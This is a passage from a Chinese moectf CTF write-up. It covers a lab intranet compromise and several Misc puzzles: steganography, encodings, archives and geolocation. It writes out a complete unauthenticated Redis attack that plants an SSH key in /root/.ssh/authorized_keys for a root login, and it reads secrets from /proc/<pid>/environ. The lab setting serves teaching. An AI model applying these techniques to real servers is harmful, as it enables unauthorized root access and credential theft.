        res = cursor.fetchall()
        return len(res)

def getPower(username):
    with Database() as (db, cursor):
        sql = 'select power from users where username=%s'
        cursor.execute(sql, username)
        res = cursor.fetchall()
        return res[0][0]

def deleteMessage(username,pubTime):
    with Database() as (db, cursor):
        sql = 'delete from message where username=%s and time=%s'
        cursor.execute(sql,(username,pubTime))
        db.commit()
        return True
```

查看源码可以得到以下内容

* 账号 - root
* 密码 - The\_P0sswOrD\_Y0u\_Nev3r\_Kn0w
* 数据库名 - messageboard

通过我们搭建的内网渗透访问 `<nsp服务端 IP>:3309` 用以上获得的账号密码登录就能进入 MySQL，可以发现 `messageboard` 库中存在表名 `flag` ，`flag` 表存在字段 `flag` ，内容如下

```
-Are-YOu-myS0L-MasT3r?-
```

#### 0x05 获取 flag3

> https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce

由于上面已经完成了映射，通过访问 `<nsp服务端 IP>:6379` 即可。先通过 `ssh-keygen` 生成一个密钥作为 SSH 登录凭证，如下所示

```bash
$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_rsa
Your public key has been saved in /home/kali/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:X8dvPV1NJ0H8CDFyeFDBvsAHPtmiQjf5UY91+r0hTHY kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|          o=*=o  |
|          oo=.o..|
|         + B =.=o|
|      . + O =++E+|
|     . .S+ *=.+.+|
|      . .....+ o*|
|       .  .   ..B|
|               o.|
|                 |
+----[SHA256]-----+
```

然后将登录凭证写入到一个文本中，并作为 ssh\_key 参数的值存进去，

```bash
$ (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > spaced_key.txt
$ cat spaced_key.txt | redis-cli -h 20.2.216.21 -p 6379 -x set ssh_key
OK
```

通过 redis-cli 连接修改 SSH 如下所示，

```bash
$ redis-cli -h <nsp服务端 IP> -p 6379
nsp服务端 IP:6379> config set dir /root/.ssh/
OK
nsp服务端 IP:6379> config set dbfilename "authorized_keys"
OK
nsp服务端 IP:6379> save
OK
nsp服务端 IP:6379>
```

最后用 ssh 连进去获得 flag 即可，如下所示。

```bash
$ ssh -i ~/.ssh/id_rsa root@<nsp服务端 IP> -p 2222
Linux e4b99e72207b 5.15.0-71-generic #78-Ubuntu SMP Tue Apr 18 09:00:29 UTC 2023 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Aug 30 08:09:50 2023 from 172.20.0.4
root@e4b99e72207b:~# ls
root@e4b99e72207b:~# cd /
root@e4b99e72207b:/# ls
bin   data  etc   home  lib32  libx32  mnt  proc  run   srv       sys  usr
boot  dev   flag  lib   lib64  media   opt  root  sbin  start.sh  tmp  var
root@e4b99e72207b:/# cat flag
Congratulations!!!
You beat this moeworld~
You need to protect your redis, even if it's on the intranet.
This is the third part of the flag
P@sSW0Rd-F0r-redis-Is-NeceSsary}
```

#### 0x06 结果 & 其他

将三段 flag 拼起来就可以得到完整的 flag 如下

```
moectf{Information-leakage-Is-dangerous!-Are-YOu-myS0L-MasT3r?-P@sSW0Rd-F0r-redis-Is-NeceSsary}
```

通过查看数据库中的 `users` 表可以看到 `admin` 的密码为 `SecurityP@sSw0Rd` 。

## Misc

### 入门指北

base64 解码就可以得到 flag。

```
moectf{h@v3_fun_@t_m15c_!}
```

### 狗子(1) 普通的猫

用 010 打开 flag 就在末尾。

moectf{eeeez\_f1ag\_as\_A\_G1ft!}

### 狗子(2) 照片

需要增加下 ruby 的堆栈大小限制

```bash
$ export RUBY_THREAD_VM_STACK_SIZE=500000000
$ zsteg bincat_hacked.png
b1,bgr,lsb,xy       .. <wbStego size=132, data="|\xB4\xCBmR\x83m\xB1]\x18"..., even=false, enc="wbStego 2.x/3.x", mix=true, controlbyte="\xCF">                         
b1,rgba,lsb,xy      .. text: "moectf{D0ggy_H1dd3n_1n_Pho7o_With_LSB!}\n"
b2,a,msb,xy         .. file: VISX image file
b2,rgb,lsb,xy       .. text: "{R3s0.\tL"
b2,rgba,msb,xy      .. text: "qFDTAQTDl"
b2,abgr,msb,xy      .. text: "=3iO{%y9/"
b3,r,msb,xy         .. text: "$&]K%Hb$E"
b4,r,lsb,xy         .. text: "eDwd\"GeS'"
b4,g,lsb,xy         .. text: "eDwdDieS'"
b4,b,lsb,xy         .. text: "dEBFUWuS"
b4,rgb,lsb,xy       .. text: "2#5DgeU#'vgj"
b4,bgr,lsb,xy       .. text: "43$EgeU#&wgk"
b4,rgba,lsb,xy      .. text: "gnD_D_#>"
b4,rgba,msb,xy      .. text: "~{sssQu5s5ubvbr"
b4,abgr,msb,xy      .. text: "7SWSg&'&"
```

### 狗子(3) 寝室

```python
import os
import subprocess
import tarfile
import zipfile
import rarfile

EXTRACT_DIR = "./unpacked"

if not os.path.exists(EXTRACT_DIR):
    os.makedirs(EXTRACT_DIR)


def extract_7z(filepath, extract_to):
    command = ["E:\\NetworkSecurity\\7-Zip\\7z.exe", "x", filepath, f"-o{extract_to}"]
    subprocess.run(command, check=True)


def extract_file(filepath, extract_to):
    if filepath.endswith('.tar'):
        with tarfile.open(filepath, 'r') as archive:
            archive.extractall(extract_to)
    elif filepath.endswith('.zip'):
        with zipfile.ZipFile(filepath, 'r') as archive:
            archive.extractall(extract_to)
    elif filepath.endswith('.rar'):
        with rarfile.RarFile(filepath, 'r') as archive:
            archive.extractall(extract_to)
    elif filepath.endswith('.gz') or filepath.endswith('.tgz'):
        with tarfile.open(filepath, 'r:gz') as archive:
            archive.extractall(extract_to)
    elif filepath.endswith('.bz2'):
        with tarfile.open(filepath, 'r:bz2') as archive:
            archive.extractall(extract_to)
    elif filepath.endswith('.7z'):
        extract_7z(filepath, extract_to)
    else:
        raise ValueError(f"Unknown archive format: {filepath}")


def unpack_archive(starting_archive):
    queue = [starting_archive]
    while queue:
        current_path = queue.pop()
        try:
            extract_file(current_path, EXTRACT_DIR)
            os.remove(current_path)
        except ValueError:
            return current_path

        for root, _, files in os.walk(EXTRACT_DIR):
            for file in files:
                queue.append(os.path.join(root, file))
    return None


flag_file = unpack_archive("ziploop.tar")

# moectf{Ca7_s133p1ng_und3r_zip_5hell5}
```

### 狗子(4) 故乡话

转 0 和 1 可以得到以下内容。

```
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
0 1 1 1 1 0 0 0 1 1 0 0 0 0 1 0 1 0 0 0 1 1 0 0 0 0 0 1 0 0 0 0 1 0 1 0 0 0 1 0 0 0 0 0 0 0 0 0 0 1 0 1 0 0 0 0 0 0 0 
0 0 0 0 0 0 0 0 0 0 1 0 0 0 1 0 1 0 0 0 0 1 0 0 0 0 1 0 1 0 0 0 1 0 1 0 0 0 1 0 0 0 0 0 1 0 0 0 0 1 0 0 0 0 0 1 0 1 0 
0 1 1 0 0 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 1 0 0 0 0 1 0 1 0 0 0 0 0 1 0 0 0 0 1 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 
0 0 0 1 1 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 1 0 1 0 0 0 1 0 0 0 0 0 1 0 1 0 
0 0 0 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 0 1 0 0 0 1 1 0 0 0 0 0 1 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 1 1 1 0 0 0 0 0 0 0 
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
```

可以看出这里面的 `1` 组成了一个特殊的字符，通过 https://www.dcode.fr/standard-galactic-alphabet 翻译可以得到以下内容

<figure><img src=".gitbook/assets/狗子(3) 寝室-1.jpg" alt=""><figcaption></figcaption></figure>

```
moectf{dontanswer}
```

### 狗子(5) 毛线球

```sh
$ nc localhost 37285
Welcome to your cat shell. Start your tracing by executing `cat doggy.py`!
(yourcat) cat doggy.py
```

通过 `cat doggy.py` 可以得到 `doggy.py` 的源码如下

```python
from time import sleep
from os import environ, system, popen
from random import randint
from sys import argv

# Note: Flag is initially in argv[1], but Doggy does the following process to hide it:

# The cat spawns many processes so you won't find him!
for _ in range(randint(100, 1000)):
    system("true")

if argv[1] != "flag{HIDDEN}":
    # The cat spawns himself again to hide the flag (and spawn lots of process again in order not to be found easily)
    environ["CATSFLAG"] = argv[1]
    popen(f"python {__file__} flag{{HIDDEN}}")
else:
    # After securely hiding himself, he sleeps before escaping to his universe...
    # Note that Doggy starts hiding exactly when the environment starts.
    # So if Doggy escapes in 5 mins, you will HAVE TO RESET your environment!
    # (i.e. run `service stop` and `service start` on the platform)
    sleep(300)
    exit()
```

代码简要意思就是，flag 会被藏在 `python ... doggy.py` 的进程中，可以通过 `cat /proc/<pid>/environ` 来获取 flag，并且这个进程会持续 5 分钟，超过五分钟进程消失后 flag 也跟着不见力。

由于能使用 `cat` ，上述脚本内容跟进程有关，那就扫一下进程吧。

```python
from pwn import *

r = remote('127.0.0.1', 38617)
print(r.recvline())

for pid in range(1, 10000):
    time.sleep(0.05)
    r.sendline(f'cat /proc/{pid}/cmdline'.encode())
    response = r.recvline()
    if b'Error: could not open file' not in response:
        print(f"Found interesting info in PID {pid}: {response}")
        
"""
[x] Opening connection to 127.0.0.1 on port 41503: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 41503: Done
b'Welcome to your cat shell. Start your tracing by executing `cat doggy.py`!\n'
Found interesting info in PID 1: b'(yourcat) sh\x00startup2.sh\x00\n'
Found interesting info in PID 864: b'(yourcat) python\x00/problem/doggy.py\x00flag{HIDDEN}\x00\n'
Found interesting info in PID 866: b'(yourcat) socat\x00tcp-l:9999,fork,reuseaddr\x00exec:python yourcat.py\x00\n'
"""
```

通过扫进程可以发现有 3 个文件，分别是 `startup2.sh` 、`doggy.py` 和 `yourcat.py` 。

* yourcat.py

```python
from cmd import Cmd


class Application(Cmd):
    intro = (
        """Welcome to your cat shell. Start your tracing by executing `cat doggy.py`!"""
    )

    prompt = "(yourcat) "

    def do_cat(self, arg: str):
        "Print the contents of a file to the screen"
        try:
            with open(arg, "r") as f:
                print(f.read())
        except:
            print("Error: could not open file")

    def do_story(self, arg):
        "Something you may want to know"
        with open("story.md", "r") as f:
            print(f.read())


try:
    Application().cmdloop()
except KeyboardInterrupt:
    print("\nGoodbye!")
```

* startup2.sh

```bash
#!/bin/sh
python doggy.py $(cat /flag) &
sleep 1
rm /flag
socat tcp-l:9999,fork,reuseaddr exec:"python yourcat.py"
exit 1
```

通过分析可以知道这题会将 flag 藏在 `doggy.py` 运行时所在的进程环境变量中，并且会删除 `/flag` 文件以免被找到，而在 `yourcat.py` 中还存在另外一条指令 `story`，这个最后我们再来说，先获取 flag ！

在扫描进程中，得知 `python /problem/doggy.py flag{HIDDEN}` 的 PID 为 864，那就通过 nc 连接来获取即可。

```bash
$ nc localhost 41503
Welcome to your cat shell. Start your tracing by executing `cat doggy.py`!
(yourcat) cat /proc/864/environ
HOSTNAME=369dd8706416SHLVL=3HOME=/rootCATSFLAG=moectf{s8kfqY3s0Mm4MJQvDHnrRkeodETIkEYk}PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPWD=/problem
```

而之前说的 story 则是一个彩蛋哦，彩蛋如下

```
# 毛线球

（本文与解题无关，且均为虚构。）

## 一

狗子很喜欢毛线球。

毛线球本来小小的，但是一拉，就能拉出很长很长的线出来。他搞不清人是怎么把这种东西缠起来的。

当然，他也喜欢人类。人类对他很好。收留他，给他吃的、玩的，会放纵他做一些他自己都觉得过分的事情，比如玩毛线球，比如把主人的床当作猫砂盆使。

他很喜欢地球，不过他知道他是时候走了。超波信号传来，他的母星被占领之前，最精英的那些逃脱了敌方的阻碍，在太空中漂泊。他要回去加入他们。

但他直到最后都搞不清楚为什么自己会喜欢做一只在地球上的猫。

## 二

收养自己的人比较奇怪。

他知道这人叫作 ReverierXu，旁边人都喊他 rx。但他总觉得 rx 和别人的差别实在太大。

比如按理来说，他活跃的时间，别人都是睡觉的，但 rx 就是不一样，总是在这些时候醒着，在地球人用的计算机器上面做着一些自己根本无法理解的东西。

还有，上次自己被偷拍，生气之余对 rx 的相机施加了一些小小的压迫，竟然也被 rx 一眼看穿。

是同类？绝对不可能。是人类口中的天才？不好说。但是，rx 旁边的人好像都把他叫作“神”。

嘶，神吗……自己的母星上，好像也有一些信仰，把那些幻想中的至高无上的个体叫作“神”。

没想到在地球上，竟然能看到真实存在的神啊……

## 三

地球和他的母星很不一样。

与他的母星比起来，地球仿佛就像最原始的生命一样。没有其他星际文明的虎视眈眈，没有埋藏在人际当中的 FTL 文明的间谍（如果他自己不算的话）。人们甚至还在为了一点点想法的差异而大动干戈。

很天真的文明，却又很幼稚。但对他来说，这种事情挺无所谓的。他很享受这里，至少不像在他的母星上，他需要时时刻刻为了下一代空间旅行技术奔波。

挺蠢的，所谓下一代空间旅行技术，还不就是敌人来了怎么逃的问题。

## 四

在被送入他自己研制的超空间传送装置时，他的上级这么对他说：

“那个星球的人很友好……尤其是对你将要暂时成为的生物而言。”

他不敢信，也不会信。所以 rx 怀抱着一只猫走进房间的那天，大家都看到了那只猫的使劲挣扎。

大家凑近，笑着。他很恐惧，但竟没有人对他怎么样。听着自己听不懂的语言，感受着自己身上的抚摸，他发现自己的身体不太想挣扎了。

人影散去，rx 为他铺张好猫砂盆和饮食器具，然后蹲在旁边看他吃饭。洛千站在旁边，和 rx 说笑着，他听不懂。

但他突然就觉得，好像来之前的那人说的确实有那么点道理。

超空间传输的能力毕竟有限，所以只能让他的母星上的一部分智慧生物转移到这颗星球。他希望他们都能这么幸运，找到一个能来养自己的人。

## 五

他不想走。但是他还是得走了。空间旅行的专家不多，他是其中之一。

超空间传送门已经在这个房间的一个角落打开，只要再过五分多钟就会关闭。只要经过这扇门，自己的外表就会恢复本来的模样，一个人类看到会讨厌的样子。不过也看不到了。

但在离开前，他看到了房间中的毛线球。他踌躇了。犹豫了一会，他走过去，用爪推着毛线球，推到了自己回家的门前。然后他趴着，在离开前的最后五分钟，再感受一下地球。

外面，rx 他们慌张的声音逐渐清晰。狗子定了定神，连人带球，一起走上了回家的路。

原谅我带走一颗毛线球的自私，毕竟我真的很喜欢这里。

## 最后

如果你发现了这个彩蛋，还请不要在群聊里透露，给大家留一个秘密（被我看见了我会撤回）。

另外，校内的同学，如果你发现了这个彩蛋，还请务必私信管理的 ZeroAurora。我会考虑给前几个发现的送一点小东西的。
```

### 狗子(6) 星尘之猫

```bash
$ nc cl.akarin.tk 10001
>> flag
<< moectf{this_is_not_the_real_flag_and_the_real_one_is_'flag.txt'}
>> next(open('flag'+chr(46)+'txt'))
<< moectf{PLz_RemembeR_tHat_iowRaPPeR_is_iteRabLe_in_PytHon!_XTDpDES04OSu9}
```

### zdjd

> https://github.com/AddOneSecondL/zdjd\_hoshino

```python
import base64

b64 = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/='
leftEye = ['o', '0', 'O', 'Ö']
mouth = ['w', 'v', '.', '_']
rightEye = ['o', '0', 'O', 'Ö']
table = []
separator = ' '

def makeTable():
    for i in range(4):
        for j in range(4):
            for k in range(4):
                table.append(leftEye[i] + mouth[j] + rightEye[k])


makeTable()

def zdjd2human(t):
    arr = t.split(separator)
    lent = len(arr)
    resultArr = []
    for i in range(lent):
        c = arr[i]
        if not c:
            continue
        n = table.index(c)
        if n < 0:
            raise ValueError('Invalid zdjd code')
        resultArr.append(b64[n])
    t = ''.join(resultArr)
    return t

print(zdjd2human('Ö_o owO 0v0 Owo o.O O.O Ö.0 OwO ÖwO 0wO Ov0 OwO Ö.O ÖvÖ Ö.0 Ov0 o.O OvÖ 0w0 OvO o_0 O.Ö Öw0 Ö_0 Ö.O Ö.O O.0 owo ÖvÖ O.o Ö.0 Övo o_0 ÖvÖ 0w0 Ö_0 Övo ow0 Ov0 Ö.0 Öwo 0wÖ O_0 O.Ö o_o 0wÖ Ö.0 Övo Ö.o Ö.Ö Övo ovo Ö.O Ö.o o_0 O.o ÖvO owO 0_0 owO Ö_o 0wÖ Öv0 0wO o.O OwÖ Öw0 O.o Öw0 O.o 0.0 O_O Ö_0 Ö.o Ö.0 0v0 Öw0 Ö.O 0_0 0vÖ Övo owÖ Ov0 0_Ö Öv0 Ö.Ö O.0 0vÖ Ö.o 0vÖ 0.0 OwÖ ÖvÖ ÖvÖ o_0 0_0 ÖwO Ö.O Övo ovo o.O 0vo Ö.0 owo Öv0 ÖvÖ Öw0 Öwo Ö.0 Ö.O o.0 O_Ö o_o O.0 Ö.0 Öwo Ö.o Ö.O ov0 Öw0 Ö_o owÖ Ö.0 Ov0 o_0 Ö.O ov0 Ö.0 Öwo Ö.O o_0 owo o_o O.Ö 0.0 OvÖ Öw0 Ö.O 0_0 ÖvÖ Ö.0 Ö.Ö 0w0 O.O Ö_o owÖ Öv0 O.O Ö.0 O.o ov0 OvÖ ÖvÖ Ö.0 0.0 Ö.O ÖvO O.o Ow0 O_o Ö.O 0vo ov0 OvÖ o.Ö OwÖ Ö.0 0w0 o.O owÖ 0.0 O_Ö ÖvÖ Ö.0 O_0 Ö_0 Öw0 Ö.O O_0 0wO o_O Ö.o O_0 Övo Öw0 ow0 O_0 ÖwO Ö.0 Ö.O Ö.0 O.Ö Öv0 O.o Ö.0 Ö_0 o.Ö ow0 Ö.0 0wÖ OvO 0vO 0_0 0v0 o_O ÖvÖ 0.o 0wo o_0 O.O 0w0 0v0 O_o O.Ö Öv0 0w0 o.O Ö.O Ow0 0.0 o.Ö 0vO o_o 0wo ÖwO OvO Ov0 0wO o_O Ö.Ö Öv0 0v0 o_o OwO Ov0 0_Ö Ö_0 0wO Ov0 0.o Ö_o Ö.Ö Öw0 0.o O_o O.O o.0 0vO O_o OvO O_0 ovO o_0 Ö.O ov0 0vo o_0 Ö.O 0.0 0.0 Ö_o Ö.O Öv0 ow0 ÖwÖ OwO O_o 0wo o_0 owO 0w0 0.0 Ö_o owO 0wo 0wo Ö_o 0vO Ö.0 0vÖ o.O Ö.O ovo 0wo o_0 owO 0v0 owo o.O OvO Ov0 0wO Öw0 0wÖ Ovo ov0 Öwo ÖvÖ 0vo Owo Öw0 O.O Öw0 0vo Ö_0 0vO O_o O_O o.O Ö.Ö Ö_o ovO O_o O.Ö Öv0 0.o Ö_0 ÖvO Ov0 0v0 o.Ö 0vO Övo 0wo ÖwO OvO Ov0 0wO o_O Ö.Ö Öv0 0v0 o_o OwO Ov0 0_Ö Ö_0 0wO Ov0 0.o Ö_o Ö.Ö Öw0 0.o O_o O.O o.0 0vO O_o OvO O_0 0vo o_0 Ö.O Öv0 ow0 Ö_0 O.Ö Ö.o Ö_Ö O_o 0wO Ov0 owÖ o.O O.O 0v0 0wÖ o.O OvO Ov0 0wO Ö_0 Ö.O o_0 0.0 o.Ö 0wO Ov0 owÖ o.O Ö.Ö Öv0 0.o O_o OvÖ O_o owÖ Öwo 0vO O_0 0vO Öwo Ö.O Öv0 0w0 Öwo 0wÖ O_o Owo Öw0 Owo 0.o O_O o.O O.O 0v0 0_O o_0 OvÖ O.o ovO O_o O.O 0w0 0_Ö o_0 OwO Ov0 0vo o.Ö OwO Ov0 OvO o.O Ö.Ö Öv0 0wÖ o.Ö owO 0v0 0_O O_o O.O O.0 0vo Ö_0 O.Ö O_0 0v0 o_o owÖ Öw0 0v0 o_o OwO Ov0 0v0 o.Ö 0vO Öw0 0_Ö Ö_0 O.O Ö.o Ö_Ö OvO 0vO 0w0 0.0 o.Ö 0vÖ Övo OwO ÖwO 0wO Ov0 owo o.O O.O Ö.o 0wo o.Ö 0vO O.0 0_0 Ö_0 ÖvO Ov0 0_Ö Ö_0 0wO Ov0 0wÖ o_o 0vÖ 0v0 Owo o_0 O.O o.0 OwÖ o_O Ö.Ö Öw0 owo Ö_0 Ö.O owo 0wo o.O Ö.Ö Öwo 0wo O_o 0vO O_0 0_o O_O 0wO 0.o 0.O O_O 0vÖ Öw0 0.o O_o 0wo  '))
#Y2lwaGVyOiByWTVBaDhCdHNZWWF0TEVQdThZQ1BVMjJHcjVQUXQ4WUdES2t2YjRiazNENEpKZUVlNWtnQ3BvRXFnUnpzTTdtOWQ4akV0RTNMVW9LcFVMUW5NY3VBdW5VMWd0cHpDNWtTVXhGY3RGVE5DTVpWSExIWk5DbzVha3pLTVJZNWJieUJQN1JOVWVHREVZb1VjCmtleTogdGhlIHRhaWxpbmcgOCBieXRlcyBvZiBoYXNoIG9mICJ6dW5kdWppYWR1PyIgd2hpY2ggYmVnaW4gd2l0aCBiNjA5MTkwNGNkZmIKaXY6IHRoZSBlbmQgOCBieXRlcyBvZiBoYXNoIG9mICJkdWR1ZHU/IiB3aGljaCBiZWdpbiB3aXRoIDI3MmJmMWRhMjIwNwoKaGludDE6IGhvdyBkbyBCaXRjb2luIGFkZHJlc3NlcyBlbmNvZGU/CmhpbnQyOiB0aGUgbmFtZSBvZiBjcnlwdG9zeXN0ZW0gaXMgImJsKioqKnNoIg
```

将上述代码进行 base64 解码可以得到内容如下

```
cipher: rY5Ah8BtsYYatLEPu8YCPU22Gr5PQt8YGDKkvb4bk3D4JJeEe5kgCpoEqgRzsM7m9d8jEtE3LUoKpULQnMcuAunU1gtpzC5kSUxFctFTNCMZVHLHZNCo5akzKMRY5bbyBP7RNUeGDEYoUc
key: the tailing 8 bytes of hash of "zundujiadu?" which begin with b6091904cdfb
iv: the end 8 bytes of hash of "dududu?" which begin with 272bf1da2207

hint1: how do Bitcoin addresses encode?
hint2: the name of cryptosystem is "bl****sh"
```

通过提示可以得知需要看看比特币地址生成算法以及寻找 `bl` 开头并且以 `sh` 结尾的加密算法，根据寻找可以确定是 `Blowfish` 算法。

> 比特币地址生成算法详解 - https://www.cnblogs.com/zhaoweiwei/p/address.html

通过比特币地址生成算法可以看到使用了 `sha-256` 和 `base58` ，将 `zundujiadu?` 和 `dududu?` 进行 sha-256 加密可以得到以下内容

```
sha256（zundujiadu?）= b6091904cdfb8c10acdbbf56ae402c6b4a5f69087778342d57e55c126f1557b3
sha256（dududu?）= 272bf1da2207f27417ba44c1c67fc7559ce543a8948b854767e9fca0871f9834
```

从而可以得出 key 和 iv 如下

```
key: 57e55c126f1557b3
iv: 67e9fca0871f9834
```

将密文进行 base58 解码后再丢进 Blowfish 解密，填进 cipher，key 和 iv ，解密后可以得到一串 base64 编码内容，解码后即可得到 flag 如下

```
moectf{wow_you_aRe_the_masteR_of_Zundujiadu_92WPIBung92WPIBung9?WPIBung}
```

### 打不开的图片1

用 010 打开搜索 flag ，可以找到 16进制内容如下

```
36 64 36 66 36 35 36 33 37 34 36 36 37 62 35 38 34 34 35 35 35 66 36 39 33 35 35 66 37 36 33 33 37 32 37 39 35 66 33 36 36 35 34 30 37 35 33 32 36 39 36 36 37 35 33 31 37 64 36 64 36 66 36 35 36 33 37 34 36 36 37 62 35 38 34 34 35 35 35 66 36 39 33 35 35 66 37 36 33 33 37 32 37 39 35 66 33 36 36 35 34 30 37 35 33 32 36 39 36 36 37 35 33 31 37 64
```

经过两次 Hex 就可以得到 flag `moectf{XDU_i5_v3ry_6e@u2ifu1}` 。

### 打不开的图片2

修改文件头 `89 50 4E 47` ，并修改图片后缀为 `.png` 就可以得到 flag `moectf{D0_yOu_1ik3_Bo7@ck_?}` 。

<figure><img src=".gitbook/assets/打不开的图片2-1.png" alt=""><figcaption></figcaption></figure>

### 机位查询

#### 0x00

第一张图的信息有 `南宁站、城市便捷酒店连锁、高铁商务酒店、猪霸王` 。

通过分析以及通过百度全景可以得知附近只有 `嘉士摩根国际` 一个高楼，故确认为 `jiashi` 。[百度地图](https://map.baidu.com/search/%E7%8C%AA%E9%9C%B8%E7%8E%8B%E7%85%AE%E7%B2%89\(%E7%81%AB%E8%BD%A6%E7%AB%99%E5%BA%97\)/@12058751.709101077,2594955.89747966,19.5z?querytype=s\&da\_src=shareurl\&wd=%E7%8C%AA%E9%9C%B8%E7%8E%8B%E7%85%AE%E7%B2%89\(%E7%81%AB%E8%BD%A6%E7%AB%99%E5%BA%97\)\&c=1\&src=0\&pn=0\&sug=0\&l=5\&b=\(4598185.960012987,705108.7499770466;18581929.960012987,8274516.749977047\)\&from=webmap\&biz\_forward=%7B%22scaler%22:2,%22styles%22:%22pl%22%7D\&device\_ratio=2)

<figure><img src=".gitbook/assets/机位查询-1.png" alt=""><figcaption></figcaption></figure>

#### 0x01

第二张图通过图片可以获得的信息 `中山路美食街` ，并且该美食街位于图片正中间，说明沿着一条直线拍摄的，根据百度全景可以得知美食街对面的高楼就是 `百盛步行街广场` ，故得到第二部分 `baisheng` 。[百度地图](https://map.baidu.com/search/%E7%99%BE%E7%9B%9B%E6%AD%A5%E8%A1%8C%E8%A1%97%E5%B9%BF%E5%9C%BA/@12059195.479963213,2593501.560549225,18.36z?querytype=s\&da\_src=shareurl\&wd=%E7%99%BE%E7%9B%9B%E6%AD%A5%E8%A1%8C%E8%A1%97%E5%B9%BF%E5%9C%BA\&c=261\&src=0\&wd2=%E5%8D%97%E5%AE%81%E5%B8%82%E5%85%B4%E5%AE%81%E5%8C%BA\&pn=0\&sug=1\&l=19\&b=\(12058913.782931838,2593214.5165782175;12059421.277068164,2593489.2234217827\)\&from=webmap\&biz\_forward=%7B%22scaler%22:2,%22styles%22:%22pl%22%7D\&sug\_forward=d05995cc8d0be96ab020a82e\&device\_ratio=2)

<figure><img src=".gitbook/assets/机位查询-2.png" alt=""><figcaption></figcaption></figure>

#### 0x02

通过第三张图可以得到以下信息

```
建筑物：时代丽都、中国人保、中国民生银行（很远）、广发银行（很远）、广西农信（很远）
GPS：108.35911345055136,22.81343269333407 High 156.08
```

因为存在远近的建筑物，根据这些建筑物画一条直线可以判断大体区域，再根据卫星图判断位置（以不会遮挡图片建筑物为准）。通过尝试 `宁汇大厦、东方明珠花园和汇金苑` ，最后在 `汇金苑` 确认了答案（flag 提交成功），得出第三部分 `huijin` 。[百度地图](https://map.baidu.com/search/%E6%97%B6%E4%BB%A3%E4%B8%BD%E9%83%BD/@12064254.043157246,2593252.355246558,18.15z/maptype%3DB\_EARTH\_MAP?querytype=s\&da\_src=shareurl\&wd=%E6%97%B6%E4%BB%A3%E4%B8%BD%E9%83%BD\&c=261\&src=0\&pn=0\&sug=0\&l=17\&b=\(12062963.947684012,2592744.1179828583;12064682.414505962,2593668.946917101\)\&from=webmap\&biz\_forward=%7B%22scaler%22:2,%22styles%22:%22sl%22%7D\&device\_ratio=2)

<figure><img src=".gitbook/assets/机位查询-3.png" alt=""><figcaption></figcaption></figure>

### 奇怪的压缩包

```
├─docProps
├─ppt
│  ├─comments
│  ├─media
│  ├─slideLayouts
│  │  └─_rels
│  ├─slideMasters
│  │  └─_rels
│  ├─slides
│  │  └─_rels
│  ├─tags
│  ├─theme
│  └─_rels
└─_rels
```

压缩包包含以上内容，根据百度搜索得知是 `.pptx` 格式的，修改后缀即可打开这个 ppt ，但是目标并不是这个 ppt ，而是直接看压缩包里面的内容，通过翻看文件最终找到了 flag 。

第一段位于 `./ppt/sildes/slide2.xml` ，通过用 010 打开可以得知 `moectf{2ip` ；

第二段位于 `./ppt/comments/comment1.xml` ，通过打开 ppt 查看该评论所在的页面因此推断出他在第二段，即 `_?_` ；

第三段位于 `./ppt/sildes/slide4.xml` ，通过用 010 打开可以得知 `n0_i4` ；

第三段位于 `./ppt/sildes/slide5.xml` ，通过用 010 打开可以得知 `_pp4x!}` ；

因此 flag 就是 `moectf{2ip_?_n0_i4_pp4x!}` 。

### building\_near\_lake

根据搜图可以找到是 厦门大学(翔安校区)-德旺图书馆（118.31768,24.612841） [百度地图](https://map.baidu.com/dir/@13171157.086975714,2810159.7013888475,19.71z,73t)

根据右键查看属性可以得知手机型号是 Xiaomi 22122RK93C，也就是红米 K30，发布会日期是 20221227，提交后就可以得到 flag 如下

```
moectf{P0sT_Y0uR_Ph0T0_wiTh_0Riginal_File_is_n0T_a_g00d_idea_YlJf!M3rux}
```

### base乐队

<figure><img src=".gitbook/assets/base乐队-1.png" alt=""><figcaption></figcaption></figure>

moectf{Th4\_6@nd\_1nc1ud45\_F3nc4\_@nd\_b@s3}

### 烫烫烫

```python
import chardet

data = "+j9k-+Zi8-+T2A-+doQ-flag+/xo-+AAo-+AAo-a9736d8ad21107398b73324694cbcd11f66e3befe67016def21dcaa9ab143bc4405be596245361f98db6a0047b4be78ede40864eb988d8a4999cdcb31592fd42c7b73df3b492403c9a379a9ff5e81262+AAo-+AAo-+T0Y-+Zi8-flag+dSg-AES+UqA-+W8Y-+ToY-+/ww-key+Zi8-+Tgs-+l2I-+j9k-+iEw-+W1c-+doQ-sha256+/wg-hash+UDw-+doQ-+XwA-+WTQ-+Zi8-b34edc782d68fda34dc23329+/wk-+AAo-+AAo-+YkA-+TuU-+i/Q-+/ww-codepage+dx8-+doQ-+X4g-+kc0-+iYE-+VUo-+/wg-+AAo-"

# 使用chardet猜测可能的编码
guess_encoding = chardet.detect(data.encode())['encoding']
